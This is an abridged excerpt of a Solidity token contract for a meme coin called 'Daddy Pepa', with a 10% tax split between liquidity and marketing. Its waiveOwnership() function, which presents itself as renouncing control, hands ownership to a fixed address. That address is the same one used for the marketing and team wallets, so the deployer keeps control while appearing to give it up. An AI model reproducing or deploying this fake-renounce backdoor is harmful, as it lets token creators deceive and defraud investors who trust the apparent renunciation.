...
10/10 Tax - 50% Liquidity, 50% Marketing
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x19F76557CEdF3389aBF291F36D15bEBf1cB5c801);
    }
...
contract DaddyPepa is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Daddy Pepa";
    string private _symbol = "DADDY PEPA";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x19F76557CEdF3389aBF291F36D15bEBf1cB5c801);
    address payable private teamWalletAddress = payable(0x19F76557CEdF3389aBF291F36D15bEBf1cB5c801);
